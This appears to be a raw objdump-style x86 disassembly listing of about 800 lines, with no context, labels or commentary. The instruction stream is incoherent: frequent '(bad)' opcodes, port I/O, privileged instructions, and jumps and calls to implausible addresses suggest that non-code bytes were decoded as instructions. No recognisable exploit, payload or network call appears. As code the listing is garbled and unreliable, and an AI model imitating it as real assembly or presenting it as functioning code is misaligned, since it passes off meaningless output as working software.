  448a76:	call   0xdda444b0
  448a7b:	pop    ebp
  448a7c:	out    dx,eax
  448a7d:	push   0xffffff89
  448a7f:	push   cs
  448a80:	sbb    al,BYTE PTR [ebp-0x20]
  448a83:	push   eax
  448a84:	(bad)  
  448a85:	(bad)  
  448a86:	in     al,dx
  448a87:	mov    eax,0x7ec6898b
  448a8c:	mov    edx,0x8f108b24
  448a91:	or     BYTE PTR [edi-0x76],al
  448a94:	loope  0x448a7f
  448a96:	jo     0x448ab6
  448a98:	aaa    
  448a99:	sub    al,0x9
  448a9b:	dec    esp
  448a9c:	add    DWORD PTR [edi],ecx
  448a9e:	mov    ecx,0xf5fa8139
  448aa3:	jmp    0x4452dcc7
  448aa8:	mov    ebp,0x686be8a6
  448aad:	arpl   WORD PTR [esi+ecx*1-0x30],dx
  448ab1:	inc    edi
  448ab2:	fiadd  WORD PTR [ebx+0x2b]
  448ab5:	dec    ecx
  448ab6:	fwait
  448ab7:	aam    0x21
  448ab9:	push   ebp
  448aba:	(bad)  
  448abb:	pusha  
  448abc:	test   al,0xa1
  448abe:	aas    
  448abf:	and    ah,BYTE PTR ds:0x5fe25e2
  448ac5:	fmul   DWORD PTR [esi+0x55]
  448ac8:	loopne 0x448aa4
  448aca:	jl     0x448aa7
  448acc:	clc    
  448acd:	sahf   
  448ace:	sub    ah,BYTE PTR [ecx]
  448ad0:	icebp  
  448ad1:	cdq    
  448ad2:	(bad)  
  448ad3:	cmp    BYTE PTR [ebx-0x1c],ah
  448ad6:	jl     0x448ab0
  448ad8:	push   edi
  448ad9:	inc    esp
  448ada:	inc    esi
  448adb:	test   BYTE PTR [eax],al
  448add:	add    esp,edx
  448adf:	inc    esp
  448ae0:	shl    al,1
  448ae2:	mov    ds:0xc231040b,eax
  448ae7:	lods   al,BYTE PTR ds:[esi]
  448ae8:	pop    es
  448ae9:	pusha  
  448aea:	cmc    
  448aeb:	xor    BYTE PTR [ebx+edi*4-0x5f3f20be],ah
  448af2:	inc    edx
  448af3:	sub    al,0xc2
  448af5:	cmp    dh,bh
  448af7:	add    eax,0x5291f4e9
  448afc:	push   esp
  448afd:	push   esp
  448afe:	lods   al,BYTE PTR ds:[esi]
  448aff:	inc    ecx
  448b00:	int    0xa0
  448b02:	mov    ch,0x67
  448b04:	and    al,0xcb
  448b06:	call   0xf6dcdac5
  448b0b:	mov    ebp,0x76c25daf
  448b10:	dec    esp
  448b11:	xor    eax,0x869f5c4c
  448b16:	mov    al,0x56
  448b18:	jle    0x448b2b
  448b1a:	mov    esi,0x29bd8e29
  448b1f:	jge    0x448b30
  448b21:	loopne 0x448b73
  448b23:	mov    cl,0xa2
  448b25:	mov    dh,BYTE PTR [ebp+0x4d]
  448b28:	sar    DWORD PTR [esi+edx*1],cl
  448b2b:	jmp    0x85d8b93d
  448b30:	xor    al,0x84
  448b32:	dec    eax
  448b33:	sbb    esp,DWORD PTR [ecx+0x3891b5b7]
  448b39:	in     al,dx
  448b3a:	cs in  al,dx
  448b3c:	pop    edi
  448b3d:	dec    edx
  448b3e:	sar    DWORD PTR [edx],cl
  448b40:	das    
  448b41:	dec    eax
  448b42:	xchg   edi,eax
  448b43:	xchg   esp,eax
  448b44:	xor    bl,ch
  448b46:	inc    edi
  448b47:	mov    ds:0x25ee8352,al
  448b4c:	addr16 add al,0x9f
  448b4f:	leave  
  448b50:	ds popa 
  448b52:	xchg   ebx,eax
  448b53:	cmp    BYTE PTR [edx+0x2],ah
  448b56:	(bad)  
  448b57:	push   esi
  448b58:	jmp    0x4ba8:0x8ae6fe28
  448b5f:	xor    esi,DWORD PTR [esi-0x5f]
  448b62:	and    DWORD PTR [ecx+0x50571caa],ebx
  448b68:	fwait
  448b69:	jno    0x448b58
  448b6b:	pop    edi
  448b6c:	je     0x448ba2
  448b6e:	push   edi
  448b6f:	or     al,0x9d
  448b71:	mov    bh,0x14
  448b73:	imul   eax
  448b75:	icebp  
  448b76:	add    BYTE PTR [esi+0x7fea8bfb],dh
  448b7c:	mov    bl,0xe6
  448b7e:	mov    esi,0xf08c6d9f
  448b83:	xchg   ecx,eax
  448b84:	xor    eax,0x866479c3
  448b89:	cli    
  448b8a:	test   BYTE PTR [eax+0x14],dl
  448b8d:	mov    eax,ds:0x33557c69
  448b92:	mov    bh,0xb6
  448b94:	test   BYTE PTR [esi-0x722f386b],bl
  448b9a:	test   DWORD PTR [ebx+0xa3cb5ee],0x84241bd9
  448ba4:	aas    
  448ba5:	outs   dx,BYTE PTR ds:[esi]
  448ba6:	enter  0x47a,0x6c
  448baa:	inc    ebp
  448bab:	xchg   ebx,eax
  448bac:	mov    esi,0x653fa249
  448bb1:	adc    eax,0xa489889f
  448bb6:	add    al,0xa1
  448bb8:	shl    DWORD PTR [ebp+0x40],0x53
  448bbc:	push   edi
  448bbd:	mov    bl,0xdc
  448bbf:	mov    edx,0x6eec99ec
  448bc4:	sbb    eax,0xb521fcb9
  448bc9:	xor    eax,DWORD PTR [esi]
  448bcb:	pusha  
  448bcc:	mov    ah,0x5c
  448bce:	mov    cl,0xb0
  448bd0:	add    eax,0xc357ec9d
  448bd5:	cwde   
  448bd6:	dec    ecx
  448bd7:	mov    cl,0x68
  448bd9:	xlat   BYTE PTR ss:[ebx]
  448bdb:	sbb    BYTE PTR [eax],dl
  448bdd:	aaa    
  448bde:	xchg   BYTE PTR [ebx],bl
  448be0:	pop    es
  448be1:	pusha  
  448be2:	scas   al,BYTE PTR es:[edi]
  448be3:	sar    BYTE PTR [esi-0x8012f0c],cl
  448be9:	in     al,dx
  448bea:	push   ebx
  448beb:	in     eax,dx
  448bec:	bound  esp,QWORD PTR [edi-0x5a]
  448bef:	call   0xf99b97d1
  448bf4:	pop    ds
  448bf5:	ss mov dl,0xf
  448bf8:	gs sub al,0x6c
  448bfb:	test   eax,0x361fbb33
  448c00:	pop    es
  448c01:	dec    esp
  448c02:	pop    ss
  448c03:	mov    WORD PTR [ebx+ebp*8+0x77],ss
  448c07:	xor    DWORD PTR [esi-0x6f],ebp
  448c0a:	nop
  448c0b:	sbb    ch,dl
  448c0d:	xor    esi,DWORD PTR [edi+0x22]
  448c10:	mov    eax,0xa0e47421
  448c15:	sar    BYTE PTR [ecx-0x5b],1
  448c18:	push   0xf9d5f0ec
  448c1d:	add    bl,ch
  448c1f:	outs   dx,DWORD PTR ds:[esi]
  448c20:	popa   
  448c21:	rol    edi,cl
  448c23:	rcl    DWORD PTR [esi],cl
  448c25:	lahf   
  448c26:	fidiv  DWORD PTR [ecx]
  448c28:	lock repz iret 
  448c2b:	rcl    BYTE PTR [ecx],1
  448c2d:	sbb    dl,BYTE PTR [ecx-0x6a]
  448c30:	or     BYTE PTR [edi],al
  448c32:	mov    DWORD PTR [eax],eax
  448c34:	push   edi
  448c35:	sbb    eax,0x923d919
  448c3a:	mov    al,ds:0x382f2c3c
  448c3f:	lock mov ds:0xb3643ac2,eax
  448c45:	and    DWORD PTR ds:[ecx+ebx*2],ecx
  448c49:	(bad)  [esi-0x7b84131]
  448c4f:	mov    ds,WORD PTR [eax-0x37ba2d95]
  448c55:	adc    BYTE PTR [ebx+0xe],al
  448c58:	xor    al,0xe8
  448c5a:	jnp    0x448c60
  448c5c:	dec    eax
  448c5d:	pop    ecx
  448c5e:	push   ds
  448c5f:	les    eax,FWORD PTR [eax+0x1f]
  448c62:	sbb    edi,0x5f
  448c65:	(bad)  
  448c66:	pop    ebx
  448c67:	int3   
  448c68:	pop    edx
  448c69:	fisttp DWORD PTR [ebx+0x5fcde06f]
  448c6f:	sub    al,0x55
  448c71:	mov    dl,0x7f
  448c73:	cwde   
  448c74:	xchg   esi,eax
  448c75:	popa   
  448c76:	jns    0x448c8e
  448c78:	pop    ds
  448c79:	and    eax,0x9c3fc113
  448c7e:	inc    esp
  448c7f:	xchg   DWORD PTR [ebp+eiz*4-0x6df93288],ebx
  448c86:	cmp    ebp,DWORD PTR [ecx-0x78747df4]
  448c8c:	push   cs
  448c8d:	hlt    
  448c8e:	push   es
  448c8f:	stos   DWORD PTR es:[edi],eax
  448c90:	into   
  448c91:	mov    edx,0xf4d93bb0
  448c96:	push   esp
  448c97:	mov    ebp,0xdaf84700
  448c9c:	xchg   ebx,eax
  448c9d:	rcl    DWORD PTR [ebx+eiz*4+0x5f04e4c6],1
  448ca4:	push   0xffffffd5
  448ca6:	add    ecx,ebx
  448ca8:	adc    DWORD PTR [ebp+esi*1+0x40673e0c],eax
  448caf:	cwde   
  448cb0:	fisttp QWORD PTR [edx]
  448cb2:	mov    BYTE PTR [edi+0x72],ah
  448cb5:	enter  0x454a,0xc7
  448cb9:	sbb    dh,dh
  448cbb:	iret   
  448cbc:	ret    
  448cbd:	sbb    BYTE PTR es:[esi+0x14604e23],cl
  448cc4:	mov    al,ds:0x16875398
  448cc9:	bound  eax,QWORD PTR [ebx+eax*4]
  448ccc:	dec    esi
  448ccd:	mov    WORD PTR [esi],es
  448ccf:	ins    BYTE PTR es:[edi],dx
  448cd0:	push   ecx
  448cd1:	push   eax
  448cd2:	dec    eax
  448cd3:	pop    ecx
  448cd4:	shl    BYTE PTR [eax-0x17e33660],1
  448cda:	xor    esp,DWORD PTR [eax+0x13]
  448cdd:	cdq    
  448cde:	dec    eax
  448cdf:	syscall 
  448ce1:	sub    eax,ebx
  448ce3:	or     al,0xbf
  448ce5:	inc    eax
  448ce6:	enter  0xf2d9,0xc6
  448cea:	loope  0x448cc6
  448cec:	or     ah,bh
  448cee:	ret    
  448cef:	ins    BYTE PTR es:[edi],dx
  448cf0:	pop    es
  448cf1:	scas   al,BYTE PTR es:[edi]
  448cf2:	iret   
  448cf3:	adc    al,0xd1
  448cf5:	int    0xa8
  448cf7:	mov    ebx,0x8d248d01
  448cfc:	les    ecx,FWORD PTR [edi-0x34e2a873]
  448d02:	or     eax,0xbb5c4239
  448d07:	mov    edx,0xcaed43e5
  448d0c:	fimul  DWORD PTR [edx-0x6e8f7dc0]
  448d12:	mov    esi,0x8d829dce
  448d17:	adc    BYTE PTR [ebp+0x24],dh
  448d1a:	mov    eax,0xc3fd01f3
  448d1f:	sti    
  448d20:	and    bh,bl
  448d22:	in     al,dx
  448d23:	retf   0x7a6f
  448d26:	mov    bh,0x7b
  448d28:	pushf  
  448d29:	jmp    0xb3f795d4
  448d2e:	cmp    edi,esi
  448d30:	retf   0x8457
  448d33:	std    
  448d34:	div    BYTE PTR [esi-0x3117315e]
  448d3a:	dec    esp
  448d3b:	push   ds
  448d3c:	xchg   DWORD PTR [ebx-0x7a],esp
  448d3f:	aas    
  448d40:	push   edi
  448d41:	add    ah,bh
  448d43:	mov    eax,DWORD PTR [esi+esi*2+0x24]
  448d47:	lods   eax,DWORD PTR ds:[esi]
  448d48:	pop    eax
  448d49:	push   esp
  448d4a:	mov    ebp,0x46cc551f
  448d4f:	call   0x2cc34bc8
  448d54:	pop    edi
  448d55:	addr16 ja 0x448d14
  448d58:	call   0x3f70c290
  448d5d:	push   esi
  448d5e:	or     DWORD PTR [eax+0x344adb04],esi
  448d64:	nop
  448d65:	adc    eax,0xf42b9635
  448d6a:	test   al,ah
  448d6c:	out    dx,al
  448d6d:	daa    
  448d6e:	cmp    al,BYTE PTR [ecx-0x63]
  448d71:	xchg   edx,eax
  448d72:	or     al,0xf3
  448d74:	into   
  448d75:	ja     0x448d5e
  448d77:	sbb    al,BYTE PTR [edx+0x33]
  448d7a:	mov    bh,0x5a
  448d7c:	dec    eax
  448d7d:	ficomp WORD PTR [eax+0x77]
  448d80:	shr    DWORD PTR [ecx-0x33],0x2c
  448d84:	test   esp,eax
  448d86:	pop    ebx
  448d87:	sub    eax,0xfb2caa39
  448d8c:	cwde   
  448d8d:	sahf   
  448d8e:	xor    al,0xbf
  448d90:	and    BYTE PTR [edx+edx*8+0x73e490cb],ah
  448d97:	cdq    
  448d98:	out    dx,al
  448d99:	adc    al,0xb8
  448d9b:	cmp    esp,DWORD PTR [esi-0x3988c0dd]
  448da1:	and    ecx,esp
  448da3:	dec    ecx
  448da4:	(bad)  
  448da5:	dec    esi
  448da6:	sub    ah,dl
  448da8:	push   edi
  448da9:	test   BYTE PTR fs:[edi],dl
  448dac:	jmp    FWORD PTR ds:0xa0a1d347
  448db2:	xchg   esi,eax
  448db3:	rol    ch,cl
  448db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448db6:	ja     0x448d61
  448db8:	add    esp,0x16
  448dbb:	stc    
  448dbc:	loope  0x448d71
  448dbe:	clc    
  448dbf:	in     eax,0xab
  448dc1:	hlt    
  448dc2:	push   ebx
  448dc3:	leave  
  448dc4:	sbb    eax,0x2f9901e0
  448dc9:	or     DWORD PTR [ecx+0x16540cad],ebp
  448dcf:	mov    edi,0x538f3e9e
  448dd4:	mov    eax,0x743b162f
  448dd9:	add    DWORD PTR [edx+esi*8],edx
  448ddc:	xchg   ebx,ebp
  448dde:	test   DWORD PTR [ebp-0x7e],edi
  448de1:	mov    ebp,0x8bae6554
  448de6:	retf   
  448de7:	or     bl,dh
  448de9:	jno    0x448df9
  448deb:	idiv   DWORD PTR [ebp-0x3]
  448dee:	cmp    BYTE PTR [ecx+0x10],dh
  448df1:	sbb    dl,al
  448df3:	ret    
  448df4:	jns    0x448df4
  448df6:	stc    
  448df7:	jp     0x448e27
  448df9:	xchg   edx,eax
  448dfa:	jae    0x448dfe
  448dfc:	add    dh,al
  448dfe:	scas   eax,DWORD PTR es:[edi]
  448dff:	sub    DWORD PTR [esi],0x26563adf
  448e05:	mov    ecx,0x5d40a499
  448e0a:	lea    eax,[edi-0x63c7bfa2]
  448e10:	xchg   edx,eax
  448e11:	cmp    al,0xe0
  448e13:	sub    eax,0xdca12ca7
  448e18:	and    ecx,DWORD PTR [ecx+ecx*4-0x33]
  448e1c:	es push ebp
  448e1e:	rol    ch,1
  448e20:	gs xchg edi,eax
  448e22:	call   0x73d88ae6
  448e27:	jno    0x448de1
  448e29:	cld    
  448e2a:	jecxz  0x448dbf
  448e2c:	xor    eax,0x7ca7f032
  448e31:	inc    ecx
  448e32:	pop    ecx
  448e33:	dec    esp
  448e34:	push   ss
  448e35:	mov    bl,0x2
  448e37:	sub    esp,DWORD PTR [eax]
  448e39:	jae    0x448e4c
  448e3b:	leave  
  448e3c:	aas    
  448e3d:	sub    BYTE PTR [eax],cl
  448e3f:	aas    
  448e40:	fnstcw WORD PTR [ebx+0x1f]
  448e43:	add    al,0x8a
  448e45:	mov    cl,0x18
  448e47:	pop    ebp
  448e48:	add    cl,al
  448e4a:	imul   ebp,DWORD PTR [ebx],0xa9a0bf10
  448e50:	mov    eax,ds:0x72425ac9
  448e55:	cld    
  448e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e57:	je     0x448ed1
  448e59:	fnstenv [edx]
  448e5b:	xchg   esi,eax
  448e5c:	lods   eax,DWORD PTR ds:[esi]
  448e5d:	retf   
  448e5e:	xchg   BYTE PTR [ebx-0x4d],dl
  448e61:	int3   
  448e62:	data16 aad 0x97
  448e65:	pop    ecx
  448e66:	iret   
  448e67:	inc    esp
  448e68:	adc    ebp,DWORD PTR [ebp+0x1453d0e9]
  448e6e:	jl     0x448e3e
  448e70:	sbb    cl,dl
  448e72:	add    DWORD PTR [esi-0x30766963],0xffffffd4
  448e79:	call   DWORD PTR [edi-0x7a]
  448e7c:	in     al,dx
  448e7d:	inc    ecx
  448e7e:	jle    0x448eb7
  448e80:	outs   dx,BYTE PTR ds:[esi]
  448e81:	xor    eax,0x428efaeb
  448e86:	mov    dl,0xec
  448e88:	adc    eax,0x90f5d635
  448e8d:	lds    ecx,FWORD PTR [eax+0x71]
  448e90:	and    ebp,DWORD PTR [eax-0x52a444ad]
  448e96:	dec    ebp
  448e97:	or     DWORD PTR [eax-0x7a],esp
  448e9a:	or     DWORD PTR [edi-0x7bd39836],edx
  448ea0:	add    BYTE PTR [ebx],dl
  448ea2:	fmul   QWORD PTR [esi]
  448ea4:	aam    0x2e
  448ea6:	ins    DWORD PTR es:[edi],dx
  448ea7:	sbb    dh,BYTE PTR [ebp-0x38ddb9b3]
  448ead:	push   edi
  448eae:	mov    ch,0x80
  448eb0:	mov    ds:0x336e0d77,al
  448eb5:	sbb    esp,ebp
  448eb7:	dec    ecx
  448eb8:	out    0x83,eax
  448eba:	loope  0x448ea9
  448ebc:	lock sar BYTE PTR [ebp*8+0x1ccae80e],0xe0
  448ec5:	mov    eax,ds:0xd695e618
  448eca:	mov    esp,0xb81cdeae
  448ecf:	stc    
  448ed0:	stos   DWORD PTR es:[edi],eax
  448ed1:	dec    edx
  448ed2:	pop    es
  448ed3:	hlt    
  448ed4:	fmul   DWORD PTR [esi-0x6f]
  448ed7:	push   cs
  448ed8:	pusha  
  448ed9:	inc    ebx
  448eda:	pop    esi
  448edb:	lods   eax,DWORD PTR ds:[esi]
  448edc:	fisubr WORD PTR [ecx]
  448ede:	loop   0x448f02
  448ee0:	mov    eax,ds:0x748547df
  448ee5:	lock pop ds
  448ee7:	xchg   esi,eax
  448ee8:	add    ebp,DWORD PTR [eax+ebp*8+0xf]
  448eec:	mov    ch,0x3b
  448eee:	inc    eax
  448eef:	pop    esp
  448ef0:	pop    edi
  448ef1:	mov    DWORD PTR [edx+edx*8+0x2914168a],0xb3efe6a5
  448efc:	sbb    dh,dh
  448efe:	add    ecx,DWORD PTR [edi]
  448f00:	gs daa 
  448f02:	add    al,0xc6
  448f04:	gs inc edi
  448f06:	inc    ecx
  448f07:	lods   al,BYTE PTR ds:[esi]
  448f08:	int    0xa5
  448f0a:	icebp  
  448f0b:	xchg   ebp,eax
  448f0c:	or     esi,ecx
  448f0e:	xlat   BYTE PTR ds:[ebx]
  448f0f:	sahf   
  448f10:	pop    es
  448f11:	jbe    0x448ea1
  448f13:	(bad)  
  448f14:	jne    0x448edb
  448f16:	inc    ecx
  448f17:	retf   0xd2ec
  448f1a:	retf   
  448f1b:	adc    bl,dh
  448f1d:	pop    ebx
  448f1e:	cmp    BYTE PTR [esi+0x19],0x8c
  448f22:	mov    dl,0xb7
  448f24:	int    0x65
  448f26:	sahf   
  448f27:	dec    esp
  448f28:	das    
  448f29:	cmp    bl,BYTE PTR [edx-0x4f]
  448f2c:	shr    edi,1
  448f2e:	icebp  
  448f2f:	sar    DWORD PTR ds:[eax+0x2bdf25dc],0x4a
  448f37:	jno    0x448f37
  448f39:	xor    dl,BYTE PTR [esi-0x69]
  448f3c:	retf   
  448f3d:	ficomp DWORD PTR [eax-0x3786b957]
  448f43:	lds    esp,FWORD PTR [ebx+0x856f2ef]
  448f49:	push   ss
  448f4a:	in     eax,0x20
  448f4c:	test   al,0xf2
  448f4e:	not    DWORD PTR [edx]
  448f50:	inc    ebp
  448f51:	pusha  
  448f52:	outs   dx,BYTE PTR ds:[esi]
  448f53:	add    BYTE PTR [edi-0x3a],dh
  448f56:	inc    ebp
  448f57:	pop    ecx
  448f58:	pop    ss
  448f59:	sbb    eax,0x5c5727ea
  448f5e:	push   ss
  448f5f:	pop    esp
  448f60:	jns    0x448f82
  448f62:	shl    bl,1
  448f64:	fdiv   QWORD PTR [esp+eax*2+0x50]
  448f68:	stc    
  448f69:	inc    edi
  448f6a:	(bad)  
  448f6b:	jmp    0xe4a9:0x7d1ef6e1
  448f72:	lods   eax,DWORD PTR ds:[esi]
  448f73:	and    BYTE PTR [eax+0xe],ah
  448f76:	les    ebx,FWORD PTR [edx+0x72ad260d]
  448f7c:	repnz and BYTE PTR [esi+0x1ddfe462],dh
  448f83:	ret    0x95d8
  448f86:	inc    ebx
  448f87:	retf   0xdaa
  448f8a:	push   0xc2141df3
  448f8f:	cmp    ecx,ecx
  448f91:	popa   
  448f92:	xor    BYTE PTR [edx-0x1a],dl
  448f95:	test   DWORD PTR [ebx-0x6a5b96c1],edi
  448f9b:	sbb    ecx,DWORD PTR [esi+0x18]
  448f9e:	fimul  WORD PTR [ecx-0x30bf3e9f]
  448fa4:	and    al,0xbe
  448fa6:	xchg   DWORD PTR [ebp-0x74],edi
  448fa9:	aaa    
  448faa:	loop   0x448fb6
  448fac:	sub    ah,cl
  448fae:	popa   
  448faf:	dec    esp
  448fb0:	out    dx,eax
  448fb1:	sti    
  448fb2:	pusha  
  448fb3:	test   BYTE PTR [ebp-0x3d],0xac
  448fb7:	mov    cs,WORD PTR [ebp+ebx*2-0x2908c6]
  448fbe:	pop    es
  448fbf:	mov    eax,DWORD PTR [eax-0x1c876162]
  448fc5:	arpl   WORD PTR [edx],sp
  448fc7:	xchg   ebx,eax
  448fc8:	pop    esi
  448fc9:	scas   al,BYTE PTR es:[edi]
  448fca:	ins    DWORD PTR es:[edi],dx
  448fcb:	fadd   DWORD PTR [edx]
  448fcd:	cmp    BYTE PTR [esi+0x30d59d15],ah
  448fd3:	je     0x44900d
  448fd5:	addr16 into 
  448fd7:	addr16 mov ds:0x5837,al
  448fdb:	shl    BYTE PTR [eax+esi*2],0x50
  448fdf:	jne    0x449045
  448fe1:	jecxz  0x449034
  448fe3:	jnp    0x44901b
  448fe5:	icebp  
  448fe6:	push   esp
  448fe7:	mul    BYTE PTR [esi]
  448fe9:	adc    edx,DWORD PTR [edi-0x6e]
  448fec:	mov    ch,BYTE PTR [ebp-0x7b]
  448fef:	inc    edi
  448ff0:	repz cmp eax,0x3db0cd63
  448ff6:	aad    0x3
  448ff8:	mov    BYTE PTR [edi],0x90
  448ffb:	and    bh,BYTE PTR [esi]
  448ffd:	inc    ecx
  448ffe:	or     eax,0x737c7991
  449004:	icebp  
  449005:	mov    ebp,0x30d1a09a
  44900a:	push   ds
  44900b:	jb     0x449086
  44900d:	dec    ecx
  44900e:	shr    BYTE PTR [esi-0x5dc0fa2e],1
  449014:	add    al,0x4c
  449016:	(bad)  
  449017:	adc    al,0x47
  449019:	outs   dx,DWORD PTR ds:[esi]
  44901a:	ja     0x448fa0
  44901c:	sahf   
  44901d:	cmp    BYTE PTR [ebx],ah
  44901f:	jne    0x448fee
  449021:	test   eax,0x516ec686
  449026:	sbb    BYTE PTR [ebx+0x30],ah
  449029:	jge    0x44904b
  44902b:	mov    esp,0xa7f448da
  449030:	cmp    BYTE PTR [eax-0x626e34b2],ah
  449036:	add    edx,DWORD PTR [esi+ebx*8-0x4]
  44903a:	sub    eax,DWORD PTR [edx-0x542e5e06]
  449040:	add    eax,0x60c93f65
  449045:	adc    al,0x82
  449047:	jge    0x448fd4
  449049:	mov    dh,0x57
  44904b:	sub    esi,ecx
  44904d:	call   0xa4acae88
  449052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449053:	test   al,0xc4
  449055:	add    esp,DWORD PTR [esi+0x3165fc3b]
  44905b:	fimul  WORD PTR [eax]
  44905d:	popa   
  44905e:	lahf   
  44905f:	popf   
  449060:	cdq    
  449061:	or     edi,DWORD PTR [edx+0x10]
  449064:	mov    bh,0x76
  449066:	div    DWORD PTR [eax]
  449068:	and    eax,0xfb17b5a2
  44906d:	mov    edi,0x566234f4
  449072:	mov    esp,0x322d5784
  449077:	je     0x449038
  449079:	popf   
  44907a:	out    0xb1,al
  44907c:	pusha  
  44907d:	pop    ebp
  44907e:	push   es
  44907f:	inc    ebp
  449080:	data16 das 
  449082:	mov    esi,0xc2b745a1
  449087:	add    bh,BYTE PTR [esi]
  449089:	dec    ebx
  44908a:	das    
  44908b:	leave  
  44908c:	push   esi
  44908d:	jne    0x4490cb
  44908f:	mov    ah,0xe0
  449091:	jmp    0x449109
  449093:	cmp    al,0x6d
  449095:	pop    ds
  449096:	mov    ch,dh
  449098:	mov    ecx,0xd6a6e59b
  44909d:	(bad)  
  44909e:	cmp    eax,0x6515b1ab
  4490a3:	jg     0x449033
  4490a5:	cmp    al,0xec
  4490a7:	mov    ebx,0x7808d2c0
  4490ac:	add    bh,al
  4490ae:	push   0x62
  4490b0:	cmp    al,0xf
  4490b2:	push   cs
  4490b3:	cmp    dl,ch
  4490b5:	jb     0x44908b
  4490b7:	push   ebx
  4490b8:	xor    dh,BYTE PTR [edi-0x3e]
  4490bb:	mov    eax,ds:0x8a6e05fa
  4490c0:	rol    DWORD PTR [ebx+0xa],0x41
  4490c4:	pop    edi
  4490c5:	fldenv [ebp+0x5609e5a7]
  4490cb:	mov    esp,0x435c24ba
  4490d0:	push   ss
  4490d1:	es mov edi,0x5003465c
  4490d7:	nop
  4490d8:	dec    ebp
  4490d9:	pop    edi
  4490da:	pop    ds
  4490db:	cli    
  4490dc:	(bad)  
  4490dd:	test   DWORD PTR [eax+0x43],0x3d883d44
  4490e4:	push   ds
  4490e5:	pop    ebp
  4490e6:	inc    ebx
  4490e7:	lahf   
  4490e8:	int3   
  4490e9:	in     al,0x93
  4490eb:	jae    0x4490ec
  4490ed:	mov    dl,0xf4
  4490ef:	cmp    al,0x73
  4490f1:	jmp    0x55f5f5ce
  4490f6:	cmp    al,0x71
  4490f8:	ret    0xd0c0
  4490fb:	jmp    0x44916b
  4490fd:	call   0x812f0c4
  449102:	push   ecx
  449103:	loop   0x449142
  449105:	push   ds
  449106:	stc    
  449107:	int    0x7e
  449109:	jb     0x4490ed
  44910b:	(bad)  
  44910c:	push   ebx
  44910d:	xchg   ch,bl
  44910f:	(bad)  
  449111:	sti    
  449112:	xor    DWORD PTR [edi-0x6f],edx
  449115:	icebp  
  449116:	inc    esi
  449117:	outs   dx,DWORD PTR ds:[esi]
  449118:	jl     0x44916c
  44911a:	addr16 jmp 0x4813:0x36bd037
  449122:	and    edx,ecx
  449124:	or     eax,0x480f1790
  449129:	mov    eax,0xdb8a06b6
  44912e:	je     0x449116
  449130:	test   eax,0x45386355
  449135:	fisttp DWORD PTR [edx]
  449137:	mov    al,0xd3
  449139:	cwde   
  44913a:	adc    eax,0x97941611
  44913f:	(bad)  
  449140:	imul   dl
  449142:	mov    ch,0x4b
  449144:	push   ebx
  449145:	loope  0x449150
  449147:	in     eax,0x8a
  449149:	xlat   BYTE PTR ds:[ebx]
  44914a:	inc    edx
  44914b:	push   ds
  44914c:	dec    edi
  44914d:	mov    ax,ds:0xe3658a14
  449153:	mov    esi,0xd68fd4bf
  449158:	fst    QWORD PTR [edx]
  44915a:	mov    ds:0x672fdd3a,eax
  44915f:	ins    BYTE PTR es:[edi],dx
  449160:	cld    
  449161:	inc    eax
  449162:	jne    0x4491dd
  449164:	or     ebx,DWORD PTR [eax-0x5e]
  449167:	ror    BYTE PTR [esi+ebp*8],cl
  44916a:	push   ecx
  44916b:	mov    dh,0xea
  44916d:	lods   al,BYTE PTR ds:[esi]
  44916e:	dec    esp
  44916f:	dec    esi
  449170:	xchg   ebx,eax
  449171:	and    ebp,DWORD PTR [eax-0x62]
  449174:	cmc    
  449175:	sbb    esp,DWORD PTR [ebp-0x5d]
  449178:	in     al,dx
  449179:	adc    al,0xa5
  44917b:	and    BYTE PTR [edx+eax*8],0x1e
  44917f:	jne    0x4491f5
  449181:	pop    ebp
  449182:	in     eax,dx
  449183:	mov    bh,al
  449185:	xchg   edi,eax
  449186:	cmp    BYTE PTR [edx-0x2fc8b3c2],ch
  44918c:	(bad)  
  44918e:	in     eax,dx
  44918f:	les    eax,FWORD PTR [edi]
  449191:	data16 hlt 
  449193:	pop    edx
  449194:	shr    DWORD PTR [ecx+edx*4+0x2e5c7ae1],cl
  44919b:	retf   0x5a41
  44919e:	adc    dh,cl
  4491a0:	sahf   
  4491a1:	fstp   TBYTE PTR [ebp+0x34]
  4491a4:	mov    al,0x1a
  4491a6:	ins    BYTE PTR es:[edi],dx
  4491a7:	mov    bh,ah
  4491a9:	adc    eax,esp
  4491ab:	int3   
  4491ac:	cwde   
  4491ad:	and    DWORD PTR [edx+0x49186dc3],0xffffffd1
  4491b4:	jle    0x44914a
  4491b6:	addr16 jne 0x44915f
  4491b9:	jae    0x44918f
  4491bb:	pop    ebx
  4491bc:	out    dx,al
  4491bd:	call   0xeafb:0x198f6ffc
  4491c4:	add    eax,0xf5388450
  4491c9:	nop
  4491ca:	(bad)  
  4491cb:	adc    bl,ch
  4491cd:	push   edi
  4491ce:	pop    ss
  4491cf:	sti    
  4491d0:	jp     0x449169
  4491d2:	push   ebp
  4491d3:	outs   dx,BYTE PTR ds:[esi]
  4491d4:	(bad)  
  4491d5:	fsub   DWORD PTR [esi+0x57ce4d25]
  4491db:	fcmovu st,st(5)
  4491dd:	sub    cl,BYTE PTR [edi-0x5812676b]
  4491e3:	bound  eax,QWORD PTR [esi-0x550390bd]
  4491e9:	adc    eax,0x8a34b20
  4491ee:	rol    dh,0xf7
  4491f1:	xchg   esi,eax
  4491f2:	or     DWORD PTR [esi+0x582edfad],ecx
  4491f8:	push   esi
  4491f9:	sub    eax,0x992a0b22
  4491fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4491ff:	fcomip st,st(4)
  449201:	xchg   BYTE PTR [ecx+0x53],bh
  449204:	and    eax,0x37ab797a
  449209:	fdivp  st(1),st
  44920b:	xor    dh,BYTE PTR [ebx+edi*2]
  44920e:	into   
  44920f:	jp     0x4491c0
  449211:	in     eax,dx
  449212:	imul   edx,DWORD PTR [ebx-0x7b40d5ed],0x9d0d6d65
  44921c:	mov    ecx,0x6be70a1e
  449221:	mov    DWORD PTR [edi+0x12],esi
  449224:	fs dec ecx
  449226:	lock inc esi
  449228:	or     dh,BYTE PTR [eax-0x2fd1cd22]
  44922e:	mov    ds:0x7f4542e5,al
  449233:	adc    al,0xf9
  449235:	cdq    
  449236:	fsub   DWORD PTR [ecx-0x14]
  449239:	cs cs lahf 
  44923c:	xor    DWORD PTR [ecx-0x1a],edi
  44923f:	iret   
  449240:	outs   dx,DWORD PTR ds:[esi]
  449241:	enter  0xcce5,0x87
  449245:	sub    DWORD PTR [edi-0x6b5ad582],edx
  44924b:	data16 jae 0x4492c1
